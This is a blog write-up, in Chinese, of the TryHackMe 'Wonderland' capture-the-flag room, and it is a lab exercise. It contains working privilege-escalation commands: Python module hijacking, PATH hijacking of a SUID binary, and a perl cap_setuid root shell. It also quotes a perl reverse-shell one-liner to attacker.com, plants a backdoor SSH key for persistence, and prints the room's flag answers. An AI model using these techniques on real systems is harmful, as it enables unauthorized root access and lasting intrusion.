---
layout: post
title: "Wonderland"
date: "2023-08-17"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - TryHackMe
---

# Wonderland
Fall down the rabbit hole and enter wonderland.

tag: ctf, alice in wonderland, privesc, linux

## Task 1: Capture the flags
Enter Wonderland and capture the flags.

Kali Linux : 10.18.72.222

Target IP Address : 10.10.43.96

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -Pn -sS 10.10.43.96
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-16 22:29 EDT
Nmap scan report for 10.10.43.96
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
```

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -Pn -sSVC -p 22,80 10.10.43.96
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-16 22:31 EDT
Nmap scan report for 10.10.43.96
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.50 seconds
```

访问：http://10.10.43.96/

```
Follow the White Rabbit.

"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)
```

保存white_rabbit_1.jpg

```
┌──(root㉿kali)-[~/Downloads]
└─# steghide info white_rabbit_1.jpg 
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

```
┌──(root㉿kali)-[~/Downloads]
└─# steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to "hint.txt".
```

```
┌──(root㉿kali)-[~/Downloads]
└─# cat hint.txt  
follow the r a b b i t
```

```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Wed Aug 16 22:48:20 EDT 2023
--------------------------------

http://10.10.43.96:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/img/
/r/
/poem/

Dirs found with a 301 response:

/http%3A%2F%2Fwww/
/http%3A%2F%2Fyoutube/
/http%3A%2F%2Fblogs/
/http%3A%2F%2Fblog/
/**http%3A%2F%2Fwww/


--------------------------------
--------------------------------
```

访问：http://10.10.43.96/img/

下载alice_door.jpg，alice_door.png

alice_door.jpg受密码保护。

```
┌──(root㉿kali)-[~/Downloads]
└─# steghide info alice_door.jpg
"alice_door.jpg":
  format: jpeg
  capacity: 68.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

访问：http://10.10.43.96/r/

```
Keep Going.

"Would you tell me, please, which way I ought to go from here?"
```

访问：http://10.10.43.96/poem/

有一首诗

访问：http://10.10.43.96/r/a/b/b/i/t/

在源码中发现alice的登录凭据。

```
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

```
┌──(root㉿kali)-[~/Downloads]
└─# ssh alice@10.10.43.96  
The authenticity of host '10.10.43.96 (10.10.43.96)' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.43.96' (ED25519) to the list of known hosts.
alice@10.10.43.96's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug 17 03:11:16 UTC 2023

  System load:  0.03               Processes:           85
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 29%                IP address for eth0: 10.10.43.96
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ whoami
alice
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

```
alice@wonderland:~$ pwd
/home/alice
alice@wonderland:~$ ls -al
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

walrus_and_the_carpenter.py是随机显示十句诗的python脚本。

```py
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

...

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

```
┌──(root㉿kali)-[~/Downloads]
└─# scp LinEnum.sh alice@10.10.43.96:/home/alice
alice@10.10.43.96's password: 
LinEnum.sh                                                                                                                 100%   46KB  35.9KB/s   00:01
```

```
### SYSTEM ##############################################
[-] Kernel information:
Linux wonderland 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.4 LTS"
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.4 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[-] Hostname:
wonderland
```

```
[-] It looks like we have some admin users:
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

```
[+] Files with POSIX capabilities set:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

这里无法SUID提权。

```
alice@wonderland:~$ cd /
alice@wonderland:/$ ls -al
drwx--x--x  4 root root       4096 May 25  2020 root
alice@wonderland:/$ cat root/user.txt
thm{"Curiouser and curiouser!"}
```

重启了Lab:

Kali Linux : 10.18.72.222

Target IP Address : 10.10.5.54

[Python Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/)

已知用户alice可以以rabbit的身份运行walrus_and_the_carpenter.py，该脚本只有root用户可写。在脚本的第一行`import random`。

尝试使用Module Overriding方法

```
alice@wonderland:~$ find / -name "random.py" 2>/dev/null
/usr/lib/python3.6/random.py
alice@wonderland:~$ ls -al /usr/lib/python3.6/random.py
-rw-r--r-- 1 root root 27442 Apr 18  2020 /usr/lib/python3.6/random.py
```

当前用户只可读，不可写该模块。

Python 在导入模块时会按照一定的路径规则来搜索模块文件。这些路径包括：

1. **内置模块：** Python 自带了一些内置模块，这些模块不需要额外导入即可使用。

2. **标准库模块：** Python 的标准库包含了大量常用的模块，这些模块可以在你的 Python 安装目录中找到。

3. **第三方模块：** Python 社区中有许多第三方库和模块，可以通过 pip 等工具进行安装。这些模块通常会被安装到 Python 的 `site-packages` 目录中。

4. **当前目录：** Python 会在执行脚本的当前目录中搜索模块文件。

5. **环境变量PYTHONPATH中指定的目录：** 如果设置了环境变量 `PYTHONPATH`，Python 会在这些指定的目录中搜索模块文件。

6. **操作系统相关的默认路径：** Python 会搜索操作系统默认的库路径，这些路径会在 Python 编译或安装时确定。

当你使用 `import` 语句导入模块时，Python 会按照上述路径规则逐一搜索，找到第一个匹配的模块文件就停止搜索。如果找不到对应的模块文件，Python 将引发 `ModuleNotFoundError`。

值得注意的是，Python 搜索模块的顺序是按照上述路径依次进行的。如果你有多个同名的模块文件，Python 会按照路径的优先级来决定使用哪一个模块。

为了方便地管理模块，避免冲突和混乱，推荐使用虚拟环境 (virtual environment) 来隔离不同项目的依赖和模块。这可以通过 Python 的 `venv`、`virtualenv` 或 `conda` 等工具来实现。

```
alice@wonderland:~$ pwd
/home/alice
alice@wonderland:~$ vim random.py
```

在alice用户的家目录下创建random.py文件，内容如下：

```python
import pty; pty.spawn("/bin/bash")
```

再次利用sudo以rabbit用户的身份执行该脚本。Python 会在执行脚本的当前目录中搜索模块文件。

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
[sudo] password for alice: 
```

获取了rabbit用户身份的shell。

```
rabbit@wonderland:~$ whoami
rabbit
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

发现SUID文件teaParty，将该文件下载到Kali上进行分析。

```
rabbit@wonderland:/home/rabbit$ python3 -m http.server 
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
┌──(root㉿kali)-[~/Downloads]
└─# strings teaParty                                           
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
teaParty.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
getchar@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

这里date没有使用绝对路径。

```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

[Hijacking Relative Paths in SUID Programs](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e)

```
rabbit@wonderland:/home/rabbit$ vim date
rabbit@wonderland:/home/rabbit$ cat date 
#!/bin/bash

/bin/bash -i
rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ ls -al date 
-rwxr-xr-x 1 rabbit rabbit 26 Aug 17 08:41 date
```

```
rabbit@wonderland:/home/rabbit$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ pwd
/home/rabbit
rabbit@wonderland:/home/rabbit$ export PATH=$(pwd):$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

```
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ whoami
hatter
hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

```
hatter@wonderland:/home/rabbit$ cd /home/hatter
hatter@wonderland:/home/hatter$ ls -al
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
```

hatter:WhyIsARavenLikeAWritingDesk?

```
hatter@wonderland:/home/hatter$ su - hatter
Password: 
hatter@wonderland:~$ whoami
hatter
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
hatter@wonderland:~$ groups hatter
hatter : hatter
```

You can search binaries with capabilities using:

```
hatter@wonderland:/$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

这个命令是用来列出文件系统中设置了特殊权限（capabilities）的文件或程序。下面对该命令的各部分进行解释：

- `getcap`: 这是一个 Linux 命令，用于获取文件或程序的特殊权限（capabilities）。特殊权限允许普通用户执行一些需要特权的操作，而无需完全以超级用户（root）身份运行。这有助于减少潜在的安全风险，因为它可以限制某些特权操作的范围。

- `-r`: 这是 `getcap` 命令的一个选项，表示递归搜索指定目录下的所有文件和子目录，以查找设置了特殊权限的文件。

- `/`: 这是要搜索的目录，通常是根目录。在这个命令中，`/` 表示从根目录开始递归搜索。

- `2>/dev/null`: 这部分是将标准错误输出（stderr）重定向到 `/dev/null`，这样错误信息就不会显示在终端上。这是为了消除不必要的干扰，只显示真正的结果。

综合起来，`getcap -r / 2>/dev/null` 命令的目的是在整个文件系统中递归地搜索设置了特殊权限（capabilities）的文件，并将结果输出到标准输出（stdout）。通过将标准错误（stderr）重定向到 `/dev/null`，命令可以保持输出的整洁，只显示有效结果，而不会显示错误消息。

特殊权限（capabilities）是一种安全机制，允许普通用户执行一些特定的特权操作，而无需完全的超级用户权限。这有助于提高系统的安全性，同时减少了需要将整个程序或脚本设置为 SUID/SGID 权限的情况。

之前LinEnum.sh也有类似的结果：

```
[+] Files with POSIX capabilities set:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

[Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

[.. / perl](https://gtfobins.github.io/gtfobins/perl/)

### .. / perl 
Shell 反弹 shell 文件读取 SUID Sudo 权限
#### Shell
可以用来在受限环境中生成一个交互式系统 shell，以打破限制环境。

```
perl -e 'exec "/bin/sh";'
```

#### 反弹 shell
可以发送一个反向 shell 给监听的攻击者，以打开远程网络访问。

在攻击者的机器上运行 `nc -l -p 12345` 来接收 shell。

```
export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### 文件读取
可以从文件中读取数据，可能用于进行特权读取或在受限文件系统之外披露文件。

```
LFILE=file_to_read
perl -ne print $LFILE
```

#### SUID
如果二进制文件设置了 SUID 位，它不会丢弃提升的权限，可能被滥用以访问文件系统，升级或保持特权访问作为 SUID 后门。如果用于运行 sh -p，对于允许默认 sh shell 以 SUID 权限运行的系统（如 Debian（<= Stretch）），省略 -p 参数。

此示例创建了一个本地 SUID 二进制文件的副本，并运行它以保持提升的权限。要与现有的 SUID 二进制文件交互，跳过第一个命令，使用其原始路径运行程序。

```
sudo install -m =xs $(which perl) .

./perl -e 'exec "/bin/sh";'
```

#### Sudo
如果二进制文件允许通过 sudo 以超级用户身份运行，它不会丢弃提升的权限，可以用于访问文件系统，升级或保持特权访问。

```
sudo perl -e 'exec "/bin/sh";'
```

#### Capabilities
如果二进制文件设置了 Linux CAP_SETUID 权限，或者由具有该权限的另一个二进制文件执行，它可以被用作后门以通过操纵其自身的进程 UID 保持特权访问。

```
cp $(which perl) .
sudo setcap cap_setuid+ep perl

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

执行如下命令：

```
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

获得root权限的shell：

```
root@wonderland:/# whoami
root
root@wonderland:/# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
root@wonderland:/# find / -name root.txt 2>/dev/null
/home/alice/root.txt
root@wonderland:/# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
root@wonderland:/# su -
root@wonderland:~# id
uid=0(root) gid=0(root) groups=0(root)
root@wonderland:~# whoami
root
root@wonderland:~# pwd
/root
root@wonderland:~# ls -al
total 28
drwx--x--x  4 root root 4096 May 25  2020 .
drwxr-xr-x 23 root root 4096 May 25  2020 ..
lrwxrwxrwx  1 root root    9 May 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 May 25  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 25  2020 .ssh
-rw-r--r--  1 root root   32 May 25  2020 user.txt
root@wonderland:~# pwd
/root
root@wonderland:~# cat user.txt
thm{"Curiouser and curiouser!"}
```

将公钥写入root用户的家目录下，实现权限维持：

```
root@wonderland:~# cd .ssh
root@wonderland:~/.ssh# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVPU5GBfIfH/nULAuQp+HxCfMoJ8M4JjtARUOSsqdXfYXaHeyUpe1iYbuEAkHbTMDa/9WCwR/pzUSZYnrbc6p7HFo2dBpU5k//MgleASy+QRMbShkPv13z7doRR/7+zXi1hQYNRfk03kZGd6WLokY2zS7SlXsAmaBleFZi/xaxwQKV4qRkHMEIXF0w2X6Pw+QqKbJFJWIh7krCih7tJd/dvvkyi7CCXeCUUHtjWwHqmnP+tN1FeeWqrXNl4/VtpkhgbaqHbECDCQpv7Kj2LvG7ZZzPjYHYdHxj0dUc6rWrLH2ABoguPy5TCsLwVaTGpPmQo9fpfDlkQokeJx+xhiytRjxlgDbfUYvu6TtSxhoZ8Zn4dEwFIKr932ZWMWnVZSDrPJQWGkdi9oXeY6vD7CyItb8e0bBP0ERdF55GtZb/12RsUS8WdTYor2oW8XTlHpZCCDltdMnFQMNn/0qYrF6uJpKUCEnF631EKtcYR0dNtXZe/0irYva12vpiZaiMCCE= root@kali
```

```
┌──(root㉿kali)-[~/Downloads]
└─# ssh root@10.10.5.54   
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug 17 09:44:25 UTC 2023

  System load:  0.0                Processes:           102
  Usage of /:   18.9% of 19.56GB   Users logged in:     1
  Memory usage: 59%                IP address for eth0: 10.10.5.54
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@wonderland:~# whoami
root
root@wonderland:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Answer the questions below
Obtain the flag in user.txt

thm{"Curiouser and curiouser!"}

Escalate your privileges, what is the flag in root.txt?

thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}